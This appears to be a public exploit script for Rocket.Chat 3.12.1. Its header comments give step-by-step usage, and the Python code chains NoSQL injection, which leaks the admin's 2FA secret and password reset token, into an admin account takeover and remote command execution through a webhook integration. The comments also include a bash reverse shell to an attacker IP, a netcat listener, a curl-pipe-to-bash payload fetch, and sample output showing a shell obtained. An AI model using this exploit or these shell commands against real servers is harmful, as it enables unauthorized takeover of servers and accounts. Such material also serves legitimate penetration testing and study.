# Title: Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2) https://www.exploit-db.com/exploits/49960
# You need a low privilege account + the administrator's email.
# You need to have an account already registered or you have to create a new account.
# The following scenario showcases the scenarion when you have the Register functionality available and you can create a new account
# Make sure you create your new account and set up your password to: P@$$w0rd!1234
# Exploitation Steps:
# 1. Create a new user (e.g. urs@gmail.com)
# 2. If you can't discover the administrator's email, log in and see if you have an email coming from the administrator and use that email address.
# 3. Once you have both emails, you can use this email straigth, but if you use the exploit from https://www.exploit-db.com/exploits/49960, you need to 
#    comment the code between lines 163 and 171.
# 4. Run the exploit.    python3 50108.py -u "urs@gmail.com" -a "admin@chatty.offsec" -t "http://192.168.68.164:3000"
#                        [+] Resetting urs@gmail.com password
#                        [+] Succesfully authenticated as urs@gmail.com
#                         Got the code for 2fa: GJLFCKKOOBCVOYSCOJYHCUZ7NAUSUMKYEZAF43RVJ5KC62JYGVYA
#                        [+] Resetting admin@chatty.offsec password
#                        [+] Password Reset Email Sent
#                        [+] Succesfully authenticated as urs@gmail.com
#                         Got the reset token: 4nUJ9s6HBgS56PD0mykshohsSxqC39CR-RVvNrgvVaJ
#                        [+] Admin password changed !
#                        CMD:> id
#                        [+] Succesfully authenticated as administrator
#                        {"success":false}
#                        
# 5. Getting the reverse shell.
#    nano shell.sh
#    bash -c 'bash -i >& /dev/tcp/192.168.49.68/4444 0>&1'             # Attacker's IP
#
# 6. Start a netcat listener
#    nc -lvnp 4444
# 7. Upload the SH file on the victim's machine using the CMD:> and run it with bash
#    CMD:> curl http://192.168.49.68:8000/shell.sh | bash
#
# 8. Check your listener
#     listening on [any] 4444 ...
#     connect to [192.168.49.68] from (UNKNOWN) [192.168.68.164] 41730
#     bash: cannot set terminal process group (770): Inappropriate ioctl for device
#     bash: no job control in this shell
#     www-data@torture:/opt/server$ 


#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
args = parser.parse_args()


adminmail = args.a
lowprivmail = args.u
target = args.t


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")


def twofactor(url,email):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {email}")

	# Getting 2fa code
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:98]
	print(f"Got the code for 2fa: {code}")
	return code

def admin_token(url,email):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {email}")

	# Getting reset token for admin
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:89]
	print(f"Got the reset token: {code}")
	return code


def changingadminpassword(url,token,code):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "403" in r.text:
		exit("[-] Wrong token")

	print("[+] Admin password changed !")


def rce(url,code,cmd):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
	_id = data[18]
	_id = _id[7:24]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	print(r.text)

############################################################
# The lines 163 to 171 have been commented for this to work

# Getting Low Priv user
#print(f"[+] Resetting {lowprivmail} password")
## Sending Reset Mail
#forgotpassword(lowprivmail,target)

## Getting reset token through blind nosql injection
#token = resettoken(target)

## Changing Password
#changingpassword(target,token)


# Privilege Escalation to admin
## Getting secret for 2fa
secret = twofactor(target,lowprivmail)


## Sending Reset mail
print(f"[+] Resetting {adminmail} password")
forgotpassword(adminmail,target)

## Getting admin reset token through nosql injection authenticated
token = admin_token(target,lowprivmail)


## Resetting Password
code = oathtool.generate_otp(secret)
changingadminpassword(target,token,code)

## Authenticating and triggering rce

while True:
	cmd = input("CMD:> ")
	code = oathtool.generate_otp(secret)
	rce(target,code,cmd)
